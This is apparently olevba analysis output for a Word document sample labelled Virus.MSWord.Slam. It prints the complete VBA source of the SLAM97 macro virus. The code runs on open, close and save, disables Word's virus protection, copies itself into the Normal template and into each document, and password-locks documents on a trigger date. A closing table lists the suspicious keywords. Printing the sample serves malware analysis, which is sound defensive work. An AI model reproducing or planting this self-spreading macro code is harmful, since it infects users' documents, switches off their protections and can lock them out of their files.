olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Slam
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Slam - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO SLAM97.bas 
in file: Virus.MSWord.Slam - OLE stream: 'Macros/VBA/SLAM97'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error GoTo SLAM97

    Application.ScreenUpdating = False
    Application.DisplayAlerts = wdAlertsNone

    WordBasic.DisableAutoMacros 0
    Options.VirusProtection = False

    Set GlobalDoc = NormalTemplate
    Set ActiveDoc = ActiveDocument

    GlobalInstalled = No
    DocumentInstalled = No

   For J = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(J).Name = "SLAM97" Then
            GlobalInstalled = Yes
        End If
   Next
    
    For I = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(I).Name = "SLAM97" Then
            DocumentInstalled = Yes
        End If
   Next
  
    If GlobalInstalled = No Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="SLAM97", Object:=wdOrganizerObjectProjectItems
        Options.SaveNormalPrompt = False
    End If
    
    If DocumentInstalled = No Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="SLAM97", Object:=wdOrganizerObjectProjectItems
        ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
    End If

    Application.DisplayAlerts = wdAlertsAll

    Payload

SLAM97:
End Sub

Sub AutoClose()
On Error GoTo SLAM97

    Application.ScreenUpdating = False
    Application.DisplayAlerts = wdAlertsNone

    WordBasic.DisableAutoMacros 0
    Options.VirusProtection = False

    Set GlobalDoc = NormalTemplate
    Set ActiveDoc = ActiveDocument

    GlobalInstalled = No
    DocumentInstalled = No

    For J = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(J).Name = "SLAM97" Then
            GlobalInstalled = Yes
        End If
    Next

    For I = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(I).Name = "SLAM97" Then
            DocumentInstalled = Yes
        End If
    Next

    If GlobalInstalled = No Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="SLAM97", Object:=wdOrganizerObjectProjectItems
        Options.SaveNormalPrompt = False
    End If
    
    If DocumentInstalled = No Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="SLAM97", Object:=wdOrganizerObjectProjectItems
        ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
    End If

    Payload

    Application.DisplayAlerts = wdAlertsAll

SLAM97:
End Sub

Sub FileSaveAs()

    Dialogs(wdDialogFileSaveAs).Show

On Error GoTo SLAM97

    Application.ScreenUpdating = False
    Application.DisplayAlerts = wdAlertsNone

    WordBasic.DisableAutoMacros 0
    Options.VirusProtection = False

    Set GlobalDoc = NormalTemplate
    Set ActiveDoc = ActiveDocument

    GlobalInstalled = No
    DocumentInstalled = No

    For J = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(J).Name = "SLAM97" Then
            GlobalInstalled = Yes
        End If
    Next
    
    For I = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(I).Name = "SLAM97" Then
            DocumentInstalled = Yes
        End If
    Next

    If GlobalInstalled = No Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="SLAM97", Object:=wdOrganizerObjectProjectItems
        Options.SaveNormalPrompt = False
    End If
    
    If DocumentInstalled = No Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="SLAM97", Object:=wdOrganizerObjectProjectItems
        ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
    End If

    Application.DisplayAlerts = wdAlertsAll

SLAM97:
End Sub

Sub Payload()
On Error GoTo SLAM97
    If Month(Now()) = 1 And Day(Now()) = 1 And Year(Now()) = 1998 Then
        If ActiveDoc.HasPassword = False Then
            ActiveDoc.Password = "SLAM97"
        End If
    End If

    If Month(Now()) = 10 And Day(Now()) = 16 Then
      MsgBox "SLAM97, written by DarkChasm [SLAM]", vbOKOnly, "SLAM97"
    End If

SLAM97:
End Sub

Sub ToolsMacro()
  Payload
End Sub

Sub FileTemplates()
  Payload
End Sub

Sub ViewVBCode()
  Payload
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

